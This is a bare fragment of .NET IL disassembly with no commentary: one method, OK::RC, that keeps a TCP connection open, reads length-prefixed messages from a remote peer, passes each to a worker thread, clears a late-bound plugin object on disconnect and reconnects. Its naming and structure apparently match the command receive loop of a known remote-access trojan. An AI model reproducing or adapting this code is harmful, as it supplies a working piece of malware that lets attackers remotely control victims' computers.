  .method public static void  RC() cil managed
  {
    // Code size       533 (0x215)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             int64 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             char V_9)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brtrue.s   IL_0016

    IL_0011:  br         IL_01c1

    IL_0016:  ldc.i4.m1
    IL_0017:  conv.i8
    IL_0018:  stloc.0
    IL_0019:  ldc.i4.0
    IL_001a:  stloc.1
    .try
    {
      IL_001b:  ldloc.1
      IL_001c:  ldc.i4.1
      IL_001d:  add.ovf
      IL_001e:  stloc.1
      IL_001f:  ldloc.1
      IL_0020:  ldc.i4.s   10
      IL_0022:  bne.un.s   IL_002c

      IL_0024:  ldc.i4.0
      IL_0025:  stloc.1
      IL_0026:  ldc.i4.1
      IL_0027:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002c:  ldsfld     bool j.OK::Cn
      IL_0031:  brtrue.s   IL_0038

      IL_0033:  leave      IL_01c1

      IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003d:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0042:  ldc.i4.1
      IL_0043:  bge.s      IL_0057

      IL_0045:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_004a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004f:  ldc.i4.m1
      IL_0050:  ldc.i4.0
      IL_0051:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0056:  pop
      IL_0057:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005c:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0061:  ldc.i4.0
      IL_0062:  cgt.un
      IL_0064:  brfalse    IL_01b0

      IL_0069:  ldloc.0
      IL_006a:  ldc.i4.m1
      IL_006b:  conv.i8
      IL_006c:  bne.un.s   IL_00e5

      IL_006e:  ldstr      ""
      IL_0073:  stloc.3
      IL_0074:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0079:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007e:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0083:  stloc.2
      IL_0084:  ldloc.2
      IL_0085:  ldc.i4.m1
      IL_0086:  bne.un.s   IL_008d

      IL_0088:  leave      IL_01c1

      IL_008d:  ldloc.2
      IL_008e:  ldc.i4.0
      IL_008f:  bne.un.s   IL_00c3

      IL_0091:  ldloc.3
      IL_0092:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0097:  stloc.0
      IL_0098:  ldstr      ""
      IL_009d:  stloc.3
      IL_009e:  ldloc.0
      IL_009f:  ldc.i4.0
      IL_00a0:  conv.i8
      IL_00a1:  bne.un.s   IL_00b1

      IL_00a3:  ldstr      ""
      IL_00a8:  call       bool j.OK::Send(string)
      IL_00ad:  pop
      IL_00ae:  ldc.i4.m1
      IL_00af:  conv.i8
      IL_00b0:  stloc.0
      IL_00b1:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b6:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bb:  ldc.i4.0
      IL_00bc:  ble        IL_001b

      IL_00c1:  br.s       IL_0057

      IL_00c3:  ldloc.3
      IL_00c4:  ldloc.2
      IL_00c5:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00ca:  stloc.s    V_9
      IL_00cc:  ldloca.s   V_9
      IL_00ce:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00d8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00dd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e2:  stloc.3
      IL_00e3:  br.s       IL_0074

      IL_00e5:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ea:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00ef:  ldc.i4.1
      IL_00f0:  add.ovf
      IL_00f1:  newarr     [mscorlib]System.Byte
      IL_00f6:  stsfld     uint8[] j.OK::b
      IL_00fb:  ldloc.0
      IL_00fc:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0101:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0106:  sub.ovf
      IL_0107:  stloc.s    V_5
      IL_0109:  ldsfld     uint8[] j.OK::b
      IL_010e:  ldlen
      IL_010f:  conv.ovf.i4
      IL_0110:  conv.i8
      IL_0111:  ldloc.s    V_5
      IL_0113:  ble.s      IL_0127

      IL_0115:  ldloc.s    V_5
      IL_0117:  ldc.i4.1
      IL_0118:  conv.i8
      IL_0119:  sub.ovf
      IL_011a:  conv.ovf.i4
      IL_011b:  ldc.i4.1
      IL_011c:  add.ovf
      IL_011d:  newarr     [mscorlib]System.Byte
      IL_0122:  stsfld     uint8[] j.OK::b
      IL_0127:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_012c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0131:  ldsfld     uint8[] j.OK::b
      IL_0136:  ldc.i4.0
      IL_0137:  ldsfld     uint8[] j.OK::b
      IL_013c:  ldlen
      IL_013d:  conv.ovf.i4
      IL_013e:  ldc.i4.0
      IL_013f:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_0144:  stloc.s    V_4
      IL_0146:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_014b:  ldsfld     uint8[] j.OK::b
      IL_0150:  ldc.i4.0
      IL_0151:  ldloc.s    V_4
      IL_0153:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0158:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_015d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0162:  ldloc.0
      IL_0163:  bne.un.s   IL_01ab

      IL_0165:  ldc.i4.m1
      IL_0166:  conv.i8
      IL_0167:  stloc.0
      IL_0168:  ldnull
      IL_0169:  ldftn      void j.OK::_Lambda$__1(object)
      IL_016f:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_0174:  ldc.i4.1
      IL_0175:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_017a:  stloc.s    V_6
      IL_017c:  ldloc.s    V_6
      IL_017e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0183:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0188:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_018d:  ldloc.s    V_6
      IL_018f:  ldc.i4.s   100
      IL_0191:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_0196:  pop
      IL_0197:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_019c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01a6:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01ab:  br         IL_001b

      IL_01b0:  leave.s    IL_01c1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b2:  dup
      IL_01b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b8:  stloc.s    V_7
      IL_01ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bf:  leave.s    IL_01c1

    }  // end handler
    IL_01c1:  nop
    .try
    {
      IL_01c2:  ldsfld     object j.OK::PLG
      IL_01c7:  brfalse.s  IL_01ea

      IL_01c9:  ldsfld     object j.OK::PLG
      IL_01ce:  ldnull
      IL_01cf:  ldstr      "clear"
      IL_01d4:  ldc.i4.0
      IL_01d5:  newarr     [mscorlib]System.Object
      IL_01da:  ldnull
      IL_01db:  ldnull
      IL_01dc:  ldnull
      IL_01dd:  ldc.i4.1
      IL_01de:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01e3:  pop
      IL_01e4:  ldnull
      IL_01e5:  stsfld     object j.OK::PLG
      IL_01ea:  leave.s    IL_01fb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ec:  dup
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f2:  stloc.s    V_8
      IL_01f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f9:  leave.s    IL_01fb

    }  // end handler
    IL_01fb:  ldc.i4.0
    IL_01fc:  stsfld     bool j.OK::Cn
    IL_0201:  call       bool j.OK::connect()
    IL_0206:  brtrue.s   IL_020a

    IL_0208:  br.s       IL_01c1

    IL_020a:  ldc.i4.1
    IL_020b:  stsfld     bool j.OK::Cn
    IL_0210:  br         IL_0000
  } // end of method OK::RC
